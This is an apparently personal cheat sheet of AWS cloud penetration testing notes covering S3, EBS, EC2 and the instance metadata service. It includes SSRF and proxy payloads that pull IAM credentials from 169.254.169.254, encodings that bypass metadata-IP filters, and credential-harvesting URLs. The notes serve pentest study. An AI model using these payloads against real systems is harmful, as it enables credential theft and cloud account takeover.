# cloud penetration testing
A curateinfrastrucd list of cloud pentesting resource, contains AWS, Azure, Google Cloud

## General
* mapping workflow
  * infrastructure mapping
  * service / container mapping
  * subdomain enum
  * url/resource mapping
  * method enum

  ```
  aws network public-ip list -- table
  aws s3 ls --profile <profile name>
  ```

* amazon ARN
  ```
   arn:partition:service:region:account-id:resource-type/resource-id
   arn:aws:iam::123456789012:user/Development/product_1234/*
  ```

 * amazon IAM
  * amazon identify and access management service
  * RBAC = role base access control
  * ABAC = Atribute base acces controll
  * IAM has user versioning : V1,V2,...

* KMS 
 * key managment service
 * is not ephemeral like access key id and secret key id in IAM
 * use for data encrypt/decrypt S3
 
 
 
 
 
 
 
 
 
 
 
 
 
 ## AWS basic info
 ### Auth methods:
* Programmatic access - Access + Secret Key
   * Secret Access Key and Access Key ID for authenticating via scripts and CLI
* Management Console Access
   * Web Portal Access to AWS

### Recon:
* AWS Usage
   * Some web applications may pull content directly from S3 buckets
   * Look to see where web resources are being loaded from to determine if S3 buckets are being utilized
   * Burp Suite
   * Navigate application like you normally would and then check for any requests to:
      * https://[bucketname].s3.amazonaws.com
      * https://s3-[region].amazonaws.com/[OrgName]

### S3:
* Amazon Simple Storage Service (S3)
   * Storage service that is “secure by default”
   * Configuration issues tend to unsecure buckets by making them publicly accessible
   * Nslookup can help reveal region
   * S3 URL Format:
      * https://[bucketname].s3.amazonaws.com
      * https://s3-[region].amazonaws.com/[Org Name]
        * aws s3 ls s3://bucket-name-here --region 
        * aws s3api get-bucket-acl --bucket bucket-name-here
        * aws s3 cp readme.txt  s3://bucket-name-here --profile newuserprofile

### EBS Volumes:
* Elastic Block Store (EBS)
* AWS virtual hard disks
* Can have similar issues to S3 being publicly available
* Difficult to target specific org but can find widespread leaks

### EC2:
* Like virtual machines
* SSH keys created when started, RDP for Windows.
* Security groups to handle open ports and allowed IPs.

### AWS Instance Metadata URL
* Cloud servers hosted on services like EC2 needed a way to orient themselves because of how dynamic they are
* A “Metadata” endpoint was created and hosted on a non-routable IP address at 169.254.169.254
* Can contain access/secret keys to AWS and IAM credentials
* This should only be reachable from the localhost
* Server compromise or SSRF vulnerabilities might allow remote attackers to reach it
* IAM credentials can be stored here:
   * http://169.254.169.254/latest/meta-data/iam/security-credentials/
* Can potentially hit it externally if a proxy service (like Nginx) is being hosted in AWS.
   * curl --proxy vulndomain.target.com:80 http://169.254.169.254/latest/meta-data/iam/security-credentials/ && echo
* CapitalOne Hack
   * Attacker exploited SSRF on EC2 server and accessed metadata URL to get IAM access keys. Then, used keys to dump S3 bucket containing 100 million individual’s data.
* AWS EC2 Instance Metadata service Version 2 (IMDSv2)
* Updated in November 2019 – Both v1 and v2 are available
* Supposed to defend the metadata service against SSRF and reverse proxy vulns
* Added session auth to requests
* First, a “PUT” request is sent and then responded to with a token
* Then, that token can be used to query data


```
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
curl http://example.com/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ISRM-WAF-Role
```



### Other bypasses
* aws eks list-clusters | jq -rc '.clusters'
```
aws eks update-kubeconfig --name example
kubectl get secrets
```
* SSRF AWS Bypasses to access metadata endpoint.
```
Converted Decimal IP: http://2852039166/latest/meta-data/
IPV6 Compressed: http://[::ffff:a9fe:a9fe]/latest/meta-data/
IPV6 Expanded: http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/
```

#### Interesting metadata instance urls:
```
http://instance-data
http://169.254.169.254
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
http://169.254.169.254/latest/dynamic/instance-identity/document
```
 
 
 
 
 
 
 
 
 
 
 
 



### refrences
* [SEC588: Cloud Penetration Testing](https://www.sans.org/cyber-security-courses/cloud-penetration-testing/)
